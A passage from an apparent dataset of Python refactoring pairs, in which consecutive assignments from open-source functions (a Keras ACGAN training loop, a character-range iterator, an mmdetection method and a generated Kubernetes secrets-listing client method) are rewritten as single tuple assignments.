    # for future MNIST digit generation
    generator.save(model_name + "".h5"")","metrics = discriminator.train_on_batch(x, [y, labels])
fmt = '%d: [disc loss: %f, srcloss: %f,'","metrics , fmt  = discriminator.train_on_batch(x, [y, labels]), '%d: [disc loss: %f, srcloss: %f,'"
Advanced-Deep-Learning-with-Keras,https://github.com/PacktPublishing/Advanced-Deep-Learning-with-Keras/tree/master/chapter5-improved-gan/acgan-mnist-5.3.1.py,,train$37,"def train(models, data, params):
    """"""Train the discriminator and adversarial Networks

    Alternately train discriminator and adversarial 
    networks by batch.
    Discriminator is trained first with real and fake 
    images and corresponding one-hot labels.
    Adversarial is trained next with fake images pretending 
    to be real and corresponding one-hot labels.
    Generate sample images per save_interval.

    # Arguments
        models (list): Generator, Discriminator,
            Adversarial models
        data (list): x_train, y_train data
        params (list): Network parameters

    """"""
    # the GAN models
    generator, discriminator, adversarial = models
    # images and their one-hot labels
    x_train, y_train = data
    # network parameters
    batch_size, latent_size, train_steps, num_labels, model_name \
            = params
    # the generator image is saved every 500 steps
    save_interval = 500
    # noise vector to see how the generator 
    # output evolves during training
    noise_input = np.random.uniform(-1.0,
                                    1.0, 
                                    size=[16, latent_size])
    # class labels are 0, 1, 2, 3, 4, 5, 
    # 6, 7, 8, 9, 0, 1, 2, 3, 4, 5
    # the generator must produce these MNIST digits
    noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
    # number of elements in train dataset
    train_size = x_train.shape[0]
    print(model_name,
          ""Labels for generated images: "",
          np.argmax(noise_label, axis=1))

    for i in range(train_steps):
        # train the discriminator for 1 batch
        # 1 batch of real (label=1.0) and fake images (label=0.0)
        # randomly pick real images and 
        # corresponding labels from dataset 
        rand_indexes = np.random.randint(0,
                                         train_size,
                                         size=batch_size)
        real_images = x_train[rand_indexes]
        real_labels = y_train[rand_indexes]
        # generate fake images from noise using generator
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0,
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # generate fake images
        fake_images = generator.predict([noise, fake_labels])
        # real + fake images = 1 batch of train data
        x = np.concatenate((real_images, fake_images))
        # real + fake labels = 1 batch of train data labels
        labels = np.concatenate((real_labels, fake_labels))

        # label real and fake images
        # real images label is 1.0
        y = np.ones([2 * batch_size, 1])
        # fake images label is 0.0
        y[batch_size:, :] = 0
        # train discriminator network, log the loss and accuracy
        # ['loss', 'activation_1_loss', 
        # 'label_loss', 'activation_1_acc', 'label_acc']
        metrics  = discriminator.train_on_batch(x, [y, labels])
        fmt = ""%d: [disc loss: %f, srcloss: %f,"" 
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (i, metrics[0], metrics[1], \
                metrics[2], metrics[3], metrics[4])

        # train the adversarial network for 1 batch
        # 1 batch of fake images with label=1.0 and
        # corresponding one-hot label or class 
        # since the discriminator weights are frozen 
        # in adversarial network only the generator is trained
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0, 
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # label fake images as real
        y = np.ones([batch_size, 1])
        # train the adversarial network 
        # note that unlike in discriminator training, 
        # we do not save the fake images in a variable
        # the fake images go to the discriminator input 
        # of the adversarial for classification
        # log the loss and accuracy
        metrics  = adversarial.train_on_batch([noise, fake_labels],
                                              [y, fake_labels])
        fmt = ""%s [advr loss: %f, srcloss: %f,""
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (log, metrics[0], metrics[1],\
                metrics[2], metrics[3], metrics[4])
        print(log)
        if (i + 1) % save_interval == 0:
            # plot generator images on a periodic basis
            gan.plot_images(generator,
                        noise_input=noise_input,
                        noise_label=noise_label,
                        show=False,
                        step=(i + 1),
                        model_name=model_name)

    # save the model after training the generator
    # the trained generator can be reloaded 
    # for future MNIST digit generation
    generator.save(model_name + "".h5"")","log = fmt % (i, metrics[0], metrics[1], metrics[2], metrics[3], metrics[4])
noise = np.random.uniform(-1.0, 1.0, size=[batch_size, latent_size])
fake_labels = np.eye(num_labels)[np.random.choice(num_labels, batch_size)]
y = np.ones([batch_size, 1])","log , noise , fake_labels , y  = fmt % (i, metrics[0], metrics[1], metrics[2], metrics[3], metrics[4]), np.random.uniform(-1.0, 1.0, size=[batch_size, latent_size]), np.eye(num_labels)[np.random.choice(num_labels, batch_size)], np.ones([batch_size, 1])"
Advanced-Deep-Learning-with-Keras,https://github.com/PacktPublishing/Advanced-Deep-Learning-with-Keras/tree/master/chapter5-improved-gan/acgan-mnist-5.3.1.py,,train$37,"def train(models, data, params):
    """"""Train the discriminator and adversarial Networks

    Alternately train discriminator and adversarial 
    networks by batch.
    Discriminator is trained first with real and fake 
    images and corresponding one-hot labels.
    Adversarial is trained next with fake images pretending 
    to be real and corresponding one-hot labels.
    Generate sample images per save_interval.

    # Arguments
        models (list): Generator, Discriminator,
            Adversarial models
        data (list): x_train, y_train data
        params (list): Network parameters

    """"""
    # the GAN models
    generator, discriminator, adversarial = models
    # images and their one-hot labels
    x_train, y_train = data
    # network parameters
    batch_size, latent_size, train_steps, num_labels, model_name \
            = params
    # the generator image is saved every 500 steps
    save_interval = 500
    # noise vector to see how the generator 
    # output evolves during training
    noise_input = np.random.uniform(-1.0,
                                    1.0, 
                                    size=[16, latent_size])
    # class labels are 0, 1, 2, 3, 4, 5, 
    # 6, 7, 8, 9, 0, 1, 2, 3, 4, 5
    # the generator must produce these MNIST digits
    noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
    # number of elements in train dataset
    train_size = x_train.shape[0]
    print(model_name,
          ""Labels for generated images: "",
          np.argmax(noise_label, axis=1))

    for i in range(train_steps):
        # train the discriminator for 1 batch
        # 1 batch of real (label=1.0) and fake images (label=0.0)
        # randomly pick real images and 
        # corresponding labels from dataset 
        rand_indexes = np.random.randint(0,
                                         train_size,
                                         size=batch_size)
        real_images = x_train[rand_indexes]
        real_labels = y_train[rand_indexes]
        # generate fake images from noise using generator
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0,
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # generate fake images
        fake_images = generator.predict([noise, fake_labels])
        # real + fake images = 1 batch of train data
        x = np.concatenate((real_images, fake_images))
        # real + fake labels = 1 batch of train data labels
        labels = np.concatenate((real_labels, fake_labels))

        # label real and fake images
        # real images label is 1.0
        y = np.ones([2 * batch_size, 1])
        # fake images label is 0.0
        y[batch_size:, :] = 0
        # train discriminator network, log the loss and accuracy
        # ['loss', 'activation_1_loss', 
        # 'label_loss', 'activation_1_acc', 'label_acc']
        metrics  = discriminator.train_on_batch(x, [y, labels])
        fmt = ""%d: [disc loss: %f, srcloss: %f,"" 
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (i, metrics[0], metrics[1], \
                metrics[2], metrics[3], metrics[4])

        # train the adversarial network for 1 batch
        # 1 batch of fake images with label=1.0 and
        # corresponding one-hot label or class 
        # since the discriminator weights are frozen 
        # in adversarial network only the generator is trained
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0, 
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # label fake images as real
        y = np.ones([batch_size, 1])
        # train the adversarial network 
        # note that unlike in discriminator training, 
        # we do not save the fake images in a variable
        # the fake images go to the discriminator input 
        # of the adversarial for classification
        # log the loss and accuracy
        metrics  = adversarial.train_on_batch([noise, fake_labels],
                                              [y, fake_labels])
        fmt = ""%s [advr loss: %f, srcloss: %f,""
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (log, metrics[0], metrics[1],\
                metrics[2], metrics[3], metrics[4])
        print(log)
        if (i + 1) % save_interval == 0:
            # plot generator images on a periodic basis
            gan.plot_images(generator,
                        noise_input=noise_input,
                        noise_label=noise_label,
                        show=False,
                        step=(i + 1),
                        model_name=model_name)

    # save the model after training the generator
    # the trained generator can be reloaded 
    # for future MNIST digit generation
    generator.save(model_name + "".h5"")","metrics = adversarial.train_on_batch([noise, fake_labels], [y, fake_labels])
fmt = '%s [advr loss: %f, srcloss: %f,'","metrics , fmt  = adversarial.train_on_batch([noise, fake_labels], [y, fake_labels]), '%s [advr loss: %f, srcloss: %f,'"
syntax_sugar_python,https://github.com/czheo/syntax_sugar_python/tree/master/syntax_sugar/_iter.py,Range,next_char$91,"def next_char():
            too_big = self.step > 0 and ord(self.curr) > ord(self.end)
            too_small = self.step < 0 and ord(self.curr) < ord(self.end)

            if too_big or too_small: raise StopIteration
            
            ret = self.curr
            self.curr = chr(ord(self.curr) + self.step)
            return ret","too_big = self.step > 0 and ord(self.curr) > ord(self.end)
too_small = self.step < 0 and ord(self.curr) < ord(self.end)","too_big , too_small  = self.step > 0 and ord(self.curr) > ord(self.end), self.step < 0 and ord(self.curr) < ord(self.end)"
syntax_sugar_python,https://github.com/czheo/syntax_sugar_python/tree/master/syntax_sugar/_iter.py,Range,next_char$91,"def next_char():
            too_big = self.step > 0 and ord(self.curr) > ord(self.end)
            too_small = self.step < 0 and ord(self.curr) < ord(self.end)

            if too_big or too_small: raise StopIteration
            
            ret = self.curr
            self.curr = chr(ord(self.curr) + self.step)
            return ret","ret = self.curr
self.curr = chr(ord(self.curr) + self.step)","ret , self.curr  = self.curr, chr(ord(self.curr) + self.step)"
mmdetection,https://github.com/open-mmlab/mmdetection/tree/master/mmdet/core/anchor/point_generator.py,MlvlPointGenerator,valid_flags$177,"def valid_flags(self, featmap_sizes, pad_shape, device='cuda'):
        """"""Generate valid flags of points of multiple feature levels.

        Args:
            featmap_sizes (list(tuple)): List of feature map sizes in
                multiple feature levels, each size arrange as
                as (h, w).
            pad_shape (tuple(int)): The padded shape of the image,
                 arrange as (h, w).
            device (str): The device where the anchors will be put on.

        Return:
            list(torch.Tensor): Valid flags of points of multiple levels.
        """"""
        assert self.num_levels == len(featmap_sizes)
        multi_level_flags = []
        for i in range(self.num_levels):
            point_stride = self.strides[i]
            feat_h, feat_w = featmap_sizes[i]
            h, w = pad_shape[:2]
            valid_feat_h = min(int(np.ceil(h / point_stride[1])), feat_h)
            valid_feat_w = min(int(np.ceil(w / point_stride[0])), feat_w)
            flags = self.single_level_valid_flags((feat_h, feat_w),
                                                  (valid_feat_h, valid_feat_w),
                                                  device=device)
            multi_level_flags.append(flags)
        return multi_level_flags","valid_feat_h = min(int(np.ceil(h / point_stride[1])), feat_h)
valid_feat_w = min(int(np.ceil(w / point_stride[0])), feat_w)","valid_feat_h , valid_feat_w  = min(int(np.ceil(h / point_stride[1])), feat_h), min(int(np.ceil(w / point_stride[0])), feat_w)"
python,https://github.com/zhanghe06/python/tree/master/kubernetes/client/api/core_v1_api.py,CoreV1Api,list_namespaced_secret_with_http_info$16081,"def list_namespaced_secret_with_http_info(self, namespace, **kwargs):  # noqa: E501
        """"""list_namespaced_secret  # noqa: E501

        list or watch objects of kind Secret  # noqa: E501
        This method makes a synchronous HTTP request by default. To make an
        asynchronous HTTP request, please pass async_req=True
        >>> thread = api.list_namespaced_secret_with_http_info(namespace, async_req=True)
        >>> result = thread.get()

        :param async_req bool: execute request asynchronously
        :param str namespace: object name and auth scope, such as for teams and projects (required)
        :param str pretty: If 'true', then the output is pretty printed.
        :param bool allow_watch_bookmarks: allowWatchBookmarks requests watch events with type \""BOOKMARK\"". Servers that do not implement bookmarks may ignore this flag and bookmarks are sent at the server's discretion. Clients should not assume bookmarks are returned at any specific interval, nor may they assume the server will send any BOOKMARK event during a session. If this is not a watch, this field is ignored. If the feature gate WatchBookmarks is not enabled in apiserver, this field is ignored.
        :param str _continue: The continue option should be set when retrieving more results from the server. Since this value is server defined, clients may only use the continue value from a previous query result with identical query parameters (except for the value of continue) and the server may reject a continue value it does not recognize. If the specified continue value is no longer valid whether due to expiration (generally five to fifteen minutes) or a configuration change on the server, the server will respond with a 410 ResourceExpired error together with a continue token. If the client needs a consistent list, it must restart their list without the continue field. Otherwise, the client may send another list request with the token received with the 410 error, the server will respond with a list starting from the next key, but from the latest snapshot, which is inconsistent from the previous list results - objects that are created, modified, or deleted after the first list request will be included in the response, as long as their keys are after the \""next key\"".  This field is not supported when watch is true. Clients may start a watch from the last resourceVersion value returned by the server and not miss any modifications.
        :param str field_selector: A selector to restrict the list of returned objects by their fields. Defaults to everything.
        :param str label_selector: A selector to restrict the list of returned objects by their labels. Defaults to everything.
        :param int limit: limit is a maximum number of responses to return for a list call. If more items exist, the server will set the `continue` field on the list metadata to a value that can be used with the same initial query to retrieve the next set of results. Setting a limit may return fewer than the requested amount of items (up to zero items) in the event all requested objects are filtered out and clients should only use the presence of the continue field to determine whether more results are available. Servers may choose not to support the limit argument and will return all of the available results. If limit is specified and the continue field is empty, clients may assume that no more results are available. This field is not supported if watch is true.  The server guarantees that the objects returned when using continue will be identical to issuing a single list call without a limit - that is, no objects created, modified, or deleted after the first request is issued will be included in any subsequent continued requests. This is sometimes referred to as a consistent snapshot, and ensures that a client that is using limit to receive smaller chunks of a very large result can ensure they see all possible objects. If objects are updated during a chunked list the version of the object that was present at the time the first list result was calculated is returned.
        :param str resource_version: resourceVersion sets a constraint on what resource versions a request may be served from. See https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-versions for details.  Defaults to unset
        :param str resource_version_match: resourceVersionMatch determines how resourceVersion is applied to list calls. It is highly recommended that resourceVersionMatch be set for list calls where resourceVersion is set See https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-versions for details.  Defaults to unset
        :param int timeout_seconds: Timeout for the list/watch call. This limits the duration of the call, regardless of any activity or inactivity.
        :param bool watch: Watch for changes to the described resources and return them as a stream of add, update, and remove notifications. Specify resourceVersion.
        :param _return_http_data_only: response data without head status code
                                       and headers
        :param _preload_content: if False, the urllib3.HTTPResponse object will
                                 be returned without reading/decoding response
                                 data. Default is True.
        :param _request_timeout: timeout setting for this request. If one
                                 number provided, it will be total request
                                 timeout. It can also be a pair (tuple) of
                                 (connection, read) timeouts.
        :return: tuple(V1SecretList, status_code(int), headers(HTTPHeaderDict))
                 If the method is called asynchronously,
                 returns the request thread.
        """"""

        local_var_params = locals()

        all_params = [
            'namespace',
            'pretty',
            'allow_watch_bookmarks',
            '_continue',
            'field_selector',
            'label_selector',
            'limit',
            'resource_version',
            'resource_version_match',
            'timeout_seconds',
            'watch'
        ]
        all_params.extend(
            [
                'async_req',
                '_return_http_data_only',
                '_preload_content',
                '_request_timeout'
            ]
        )

        for key, val in six.iteritems(local_var_params['kwargs']):
            if key not in all_params:
                raise ApiTypeError(
                    ""Got an unexpected keyword argument '%s'""
                    "" to method list_namespaced_secret"" % key
                )
            local_var_params[key] = val
        del local_var_params['kwargs']
        # verify the required parameter 'namespace' is set
        if self.api_client.client_side_validation and ('namespace' not in local_var_params or  # noqa: E501
                                                        local_var_params['namespace'] is None):  # noqa: E501
            raise ApiValueError(""Missing the required parameter `namespace` when calling `list_namespaced_secret`"")  # noqa: E501

        collection_formats = {}

        path_params = {}
        if 'namespace' in local_var_params:
            path_params['namespace'] = local_var_params['namespace']  # noqa: E501

        query_params = []
        if 'pretty' in local_var_params and local_var_params['pretty'] is not None:  # noqa: E501
            query_params.append(('pretty', local_var_params['pretty']))  # noqa: E501
        if 'allow_watch_bookmarks' in local_var_params and local_var_params['allow_watch_bookmarks'] is not None:  # noqa: E501
            query_params.append(('allowWatchBookmarks', local_var_params['allow_watch_bookmarks']))  # noqa: E501
        if '_continue' in local_var_params and local_var_params['_continue'] is not None:  # noqa: E501
            query_params.append(('continue', local_var_params['_continue']))  # noqa: E501
        if 'field_selector' in local_var_params and local_var_params['field_selector'] is not None:  # noqa: E501
            query_params.append(('fieldSelector', local_var_params['field_selector']))  # noqa: E501
        if 'label_selector' in local_var_params and local_var_params['label_selector'] is not None:  # noqa: E501
            query_params.append(('labelSelector', local_var_params['label_selector']))  # noqa: E501
        if 'limit' in local_var_params and local_var_params['limit'] is not None:  # noqa: E501
            query_params.append(('limit', local_var_params['limit']))  # noqa: E501
        if 'resource_version' in local_var_params and local_var_params['resource_version'] is not None:  # noqa: E501
            query_params.append(('resourceVersion', local_var_params['resource_version']))  # noqa: E501
        if 'resource_version_match' in local_var_params and local_var_params['resource_version_match'] is not None:  # noqa: E501
            query_params.append(('resourceVersionMatch', local_var_params['resource_version_match']))  # noqa: E501
        if 'timeout_seconds' in local_var_params and local_var_params['timeout_seconds'] is not None:  # noqa: E501
            query_params.append(('timeoutSeconds', local_var_params['timeout_seconds']))  # noqa: E501
        if 'watch' in local_var_params and local_var_params['watch'] is not None:  # noqa: E501
            query_params.append(('watch', local_var_params['watch']))  # noqa: E501

        header_params = {}

        form_params = []
        local_var_files = {}

        body_params = None
        # HTTP header `Accept`
        header_params['Accept'] = self.api_client.select_header_accept(
            ['application/json', 'application/yaml', 'application/vnd.kubernetes.protobuf', 'application/json;stream=watch', 'application/vnd.kubernetes.protobuf;stream=watch'])  # noqa: E501

        # Authentication setting
        auth_settings = ['BearerToken']  # noqa: E501

        return self.api_client.call_api(
            '/api/v1/namespaces/{namespace}/secrets', 'GET',
            path_params,
            query_params,
            header_params,
            body=body_params,
            post_params=form_params,
            files=local_var_files,
            response_type='V1SecretList',  # noqa: E501
            auth_settings=auth_settings,
            async_req=local_var_params.get('async_req'),
            _return_http_data_only=local_var_params.get('_return_http_data_only'),  # noqa: E501
            _preload_content=local_var_params.get('_preload_content', True),
            _request_timeout=local_var_params.get('_request_timeout'),
            collection_formats=collection_formats)","local_var_params = locals()
all_params = ['namespace', 'pretty', 'allow_watch_bookmarks', '_continue', 'field_selector', 'label_selector', 'limit', 'resource_version', 'resource_version_match', 'timeout_seconds', 'watch']","local_var_params , all_params  = locals(), ['namespace', 'pretty', 'allow_watch_bookmarks', '_continue', 'field_selector', 'label_selector', 'limit', 'resource_version', 'resource_version_match', 'timeout_seconds', 'watch']"
python,https://github.com/zhanghe06/python/tree/master/kubernetes/client/api/core_v1_api.py,CoreV1Api,list_namespaced_secret_with_http_info$16081,"def list_namespaced_secret_with_http_info(self, namespace, **kwargs):  # noqa: E501
        """"""list_namespaced_secret  # noqa: E501

        list or watch objects of kind Secret  # noqa: E501
        This method makes a synchronous HTTP request by default. To make an
        asynchronous HTTP request, please pass async_req=True
        >>> thread = api.list_namespaced_secret_with_http_info(namespace, async_req=True)
        >>> result = thread.get()

        :param async_req bool: execute request asynchronously
        :param str namespace: object name and auth scope, such as for teams and projects (required)
        :param str pretty: If 'true', then the output is pretty printed.
        :param bool allow_watch_bookmarks: allowWatchBookmarks requests watch events with type \""BOOKMARK\"". Servers that do not implement bookmarks may ignore this flag and bookmarks are sent at the server's discretion. Clients should not assume bookmarks are returned at any specific interval, nor may they assume the server will send any BOOKMARK event during a session. If this is not a watch, this field is ignored. If the feature gate WatchBookmarks is not enabled in apiserver, this field is ignored.
        :param str _continue: The continue option should be set when retrieving more results from the server. Since this value is server defined, clients may only use the continue value from a previous query result with identical query parameters (except for the value of continue) and the server may reject a continue value it does not recognize. If the specified continue value is no longer valid whether due to expiration (generally five to fifteen minutes) or a configuration change on the server, the server will respond with a 410 ResourceExpired error together with a continue token. If the client needs a consistent list, it must restart their list without the continue field. Otherwise, the client may send another list request with the token received with the 410 error, the server will respond with a list starting from the next key, but from the latest snapshot, which is inconsistent from the previous list results - objects that are created, modified, or deleted after the first list request will be included in the response, as long as their keys are after the \""next key\"".  This field is not supported when watch is true. Clients may start a watch from the last resourceVersion value returned by the server and not miss any modifications.
        :param str field_selector: A selector to restrict the list of returned objects by their fields. Defaults to everything.
        :param str label_selector: A selector to restrict the list of returned objects by their labels. Defaults to everything.
        :param int limit: limit is a maximum number of responses to return for a list call. If more items exist, the server will set the `continue` field on the list metadata to a value that can be used with the same initial query to retrieve the next set of results. Setting a limit may return fewer than the requested amount of items (up to zero items) in the event all requested objects are filtered out and clients should only use the presence of the continue field to determine whether more results are available. Servers may choose not to support the limit argument and will return all of the available results. If limit is specified and the continue field is empty, clients may assume that no more results are available. This field is not supported if watch is true.  The server guarantees that the objects returned when using continue will be identical to issuing a single list call without a limit - that is, no objects created, modified, or deleted after the first request is issued will be included in any subsequent continued requests. This is sometimes referred to as a consistent snapshot, and ensures that a client that is using limit to receive smaller chunks of a very large result can ensure they see all possible objects. If objects are updated during a chunked list the version of the object that was present at the time the first list result was calculated is returned.
        :param str resource_version: resourceVersion sets a constraint on what resource versions a request may be served from. See https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-versions for details.  Defaults to unset
        :param str resource_version_match: resourceVersionMatch determines how resourceVersion is applied to list calls. It is highly recommended that resourceVersionMatch be set for list calls where resourceVersion is set See https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-versions for details.  Defaults to unset
        :param int timeout_seconds: Timeout for the list/watch call. This limits the duration of the call, regardless of any activity or inactivity.
        :param bool watch: Watch for changes to the described resources and return them as a stream of add, update, and remove notifications. Specify resourceVersion.
        :param _return_http_data_only: response data without head status code
                                       and headers
        :param _preload_content: if False, the urllib3.HTTPResponse object will
                                 be returned without reading/decoding response
                                 data. Default is True.
        :param _request_timeout: timeout setting for this request. If one
                                 number provided, it will be total request
                                 timeout. It can also be a pair (tuple) of
                                 (connection, read) timeouts.
        :return: tuple(V1SecretList, status_code(int), headers(HTTPHeaderDict))
                 If the method is called asynchronously,
                 returns the request thread.
        """"""

        local_var_params = locals()

        all_params = [
            'namespace',
            'pretty',
            'allow_watch_bookmarks',
            '_continue',
            'field_selector',
            'label_selector',
            'limit',
            'resource_version',
            'resource_version_match',
            'timeout_seconds',
            'watch'
        ]
        all_params.extend(
            [
                'async_req',
                '_return_http_data_only',
                '_preload_content',
                '_request_timeout'
            ]
        )

        for key, val in six.iteritems(local_var_params['kwargs']):
            if key not in all_params:
                raise ApiTypeError(
                    ""Got an unexpected keyword argument '%s'""
                    "" to method list_namespaced_secret"" % key
                )
            local_var_params[key] = val
        del local_var_params['kwargs']
        # verify the required parameter 'namespace' is set
        if self.api_client.client_side_validation and ('namespace' not in local_var_params or  # noqa: E501
                                                        local_var_params['namespace'] is None):  # noqa: E501
            raise ApiValueError(""Missing the required parameter `namespace` when calling `list_namespaced_secret`"")  # noqa: E501

        collection_formats = {}

        path_params = {}
        if 'namespace' in local_var_params:
            path_params['namespace'] = local_var_params['namespace']  # noqa: E501

        query_params = []
        if 'pretty' in local_var_params and local_var_params['pretty'] is not None:  # noqa: E501
            query_params.append(('pretty', local_var_params['pretty']))  # noqa: E501
        if 'allow_watch_bookmarks' in local_var_params and local_var_params['allow_watch_bookmarks'] is not None:  # noqa: E501
            query_params.append(('allowWatchBookmarks', local_var_params['allow_watch_bookmarks']))  # noqa: E501
        if '_continue' in local_var_params and local_var_params['_continue'] is not None:  # noqa: E501
            query_params.append(('continue', local_var_params['_continue']))  # noqa: E501
        if 'field_selector' in local_var_params and local_var_params['field_selector'] is not None:  # noqa: E501
            query_params.append(('fieldSelector', local_var_params['field_selector']))  # noqa: E501
        if 'label_selector' in local_var_params and local_var_params['label_selector'] is not None:  # noqa: E501
            query_params.append(('labelSelector', local_var_params['label_selector']))  # noqa: E501
        if 'limit' in local_var_params and local_var_params['limit'] is not None:  # noqa: E501
            query_params.append(('limit', local_var_params['limit']))  # noqa: E501
        if 'resource_version' in local_var_params and local_var_params['resource_version'] is not None:  # noqa: E501
            query_params.append(('resourceVersion', local_var_params['resource_version']))  # noqa: E501
        if 'resource_version_match' in local_var_params and local_var_params['resource_version_match'] is not None:  # noqa: E501
            query_params.append(('resourceVersionMatch', local_var_params['resource_version_match']))  # noqa: E501
        if 'timeout_seconds' in local_var_params and local_var_params['timeout_seconds'] is not None:  # noqa: E501
            query_params.append(('timeoutSeconds', local_var_params['timeout_seconds']))  # noqa: E501
        if 'watch' in local_var_params and local_var_params['watch'] is not None:  # noqa: E501
            query_params.append(('watch', local_var_params['watch']))  # noqa: E501

        header_params = {}

        form_params = []
        local_var_files = {}

        body_params = None
        # HTTP header `Accept`
        header_params['Accept'] = self.api_client.select_header_accept(
            ['application/json', 'application/yaml', 'application/vnd.kubernetes.protobuf', 'application/json;stream=watch', 'application/vnd.kubernetes.protobuf;stream=watch'])  # noqa: E501

        # Authentication setting
        auth_settings = ['BearerToken']  # noqa: E501

        return self.api_client.call_api(
            '/api/v1/namespaces/{namespace}/secrets', 'GET',
            path_params,
            query_params,
            header_params,
            body=body_params,
            post_params=form_params,
            files=local_var_files,
            response_type='V1SecretList',  # noqa: E501
            auth_settings=auth_settings,
            async_req=local_var_params.get('async_req'),
            _return_http_data_only=local_var_params.get('_return_http_data_only'),  # noqa: E501
            _preload_content=local_var_params.get('_preload_content', True),
            _request_timeout=local_var_params.get('_request_timeout'),
            collection_formats=collection_formats)","collection_formats = {}
path_params = {}","collection_formats , path_params  = {}, {}"
python,https://github.com/zhanghe06/python/tree/master/kubernetes/client/api/core_v1_api.py,CoreV1Api,list_namespaced_secret_with_http_info$16081,"def list_namespaced_secret_with_http_info(self, namespace, **kwargs):  # noqa: E501
        """"""list_namespaced_secret  # noqa: E501

        list or watch objects of kind Secret  # noqa: E501
        This method makes a synchronous HTTP request by default. To make an
        asynchronous HTTP request, please pass async_req=True
        >>> thread = api.list_namespaced_secret_with_http_info(namespace, async_req=True)
        >>> result = thread.get()

        :param async_req bool: execute request asynchronously
        :param str namespace: object name and auth scope, such as for teams and projects (required)
        :param str pretty: If 'true', then the output is pretty printed.
        :param bool allow_watch_bookmarks: allowWatchBookmarks requests watch events with type \""BOOKMARK\"". Servers that do not implement bookmarks may ignore this flag and bookmarks are sent at the server's discretion. Clients should not assume bookmarks are returned at any specific interval, nor may they assume the server will send any BOOKMARK event during a session. If this is not a watch, this field is ignored. If the feature gate WatchBookmarks is not enabled in apiserver, this field is ignored.
        :param str _continue: The continue option should be set when retrieving more results from the server. Since this value is server defined, clients may only use the continue value from a previous query result with identical query parameters (except for the value of continue) and the server may reject a continue value it does not recognize. If the specified continue value is no longer valid whether due to expiration (generally five to fifteen minutes) or a configuration change on the server, the server will respond with a 410 ResourceExpired error together with a continue token. If the client needs a consistent list, it must restart their list without the continue field. Otherwise, the client may send another list request with the token received with the 410 error, the server will respond with a list starting from the next key, but from the latest snapshot, which is inconsistent from the previous list results - objects that are created, modified, or deleted after the first list request will be included in the response, as long as their keys are after the \""next key\"".  This field is not supported when watch is true. Clients may start a watch from the last resourceVersion value returned by the server and not miss any modifications.
        :param str field_selector: A selector to restrict the list of returned objects by their fields. Defaults to everything.
        :param str label_selector: A selector to restrict the list of returned objects by their labels. Defaults to everything.
        :param int limit: limit is a maximum number of responses to return for a list call. If more items exist, the server will set the `continue` field on the list metadata to a value that can be used with the same initial query to retrieve the next set of results. Setting a limit may return fewer than the requested amount of items (up to zero items) in the event all requested objects are filtered out and clients should only use the presence of the continue field to determine whether more results are available. Servers may choose not to support the limit argument and will return all of the available results. If limit is specified and the continue field is empty, clients may assume that no more results are available. This field is not supported if watch is true.  The server guarantees that the objects returned when using continue will be identical to issuing a single list call without a limit - that is, no objects created, modified, or deleted after the first request is issued will be included in any subsequent continued requests. This is sometimes referred to as a consistent snapshot, and ensures that a client that is using limit to receive smaller chunks of a very large result can ensure they see all possible objects. If objects are updated during a chunked list the version of the object that was present at the time the first list result was calculated is returned.
        :param str resource_version: resourceVersion sets a constraint on what resource versions a request may be served from. See https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-versions for details.  Defaults to unset
        :param str resource_version_match: resourceVersionMatch determines how resourceVersion is applied to list calls. It is highly recommended that resourceVersionMatch be set for list calls where resourceVersion is set See https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-versions for details.  Defaults to unset
        :param int timeout_seconds: Timeout for the list/watch call. This limits the duration of the call, regardless of any activity or inactivity.
        :param bool watch: Watch for changes to the described resources and return them as a stream of add, update, and remove notifications. Specify resourceVersion.
        :param _return_http_data_only: response data without head status code
                                       and headers
        :param _preload_content: if False, the urllib3.HTTPResponse object will
                                 be returned without reading/decoding response
                                 data. Default is True.
        :param _request_timeout: timeout setting for this request. If one
                                 number provided, it will be total request
                                 timeout. It can also be a pair (tuple) of
                                 (connection, read) timeouts.
        :return: tuple(V1SecretList, status_code(int), headers(HTTPHeaderDict))
                 If the method is called asynchronously,
                 returns the request thread.
        """"""

        local_var_params = locals()

        all_params = [
            'namespace',
            'pretty',
            'allow_watch_bookmarks',
            '_continue',
            'field_selector',
            'label_selector',
            'limit',
            'resource_version',
            'resource_version_match',
            'timeout_seconds',
            'watch'
        ]
        all_params.extend(
            [
                'async_req',
                '_return_http_data_only',
                '_preload_content',
                '_request_timeout'
            ]
        )

        for key, val in six.iteritems(local_var_params['kwargs']):
            if key not in all_params:
                raise ApiTypeError(
                    ""Got an unexpected keyword argument '%s'""
                    "" to method list_namespaced_secret"" % key
                )
            local_var_params[key] = val
        del local_var_params['kwargs']
        # verify the required parameter 'namespace' is set
        if self.api_client.client_side_validation and ('namespace' not in local_var_params or  # noqa: E501
                                                        local_var_params['namespace'] is None):  # noqa: E501
            raise ApiValueError(""Missing the required parameter `namespace` when calling `list_namespaced_secret`"")  # noqa: E501

        collection_formats = {}

        path_params = {}
        if 'namespace' in local_var_params:
            path_params['namespace'] = local_var_params['namespace']  # noqa: E501

        query_params = []
        if 'pretty' in local_var_params and local_var_params['pretty'] is not None:  # noqa: E501
            query_params.append(('pretty', local_var_params['pretty']))  # noqa: E501
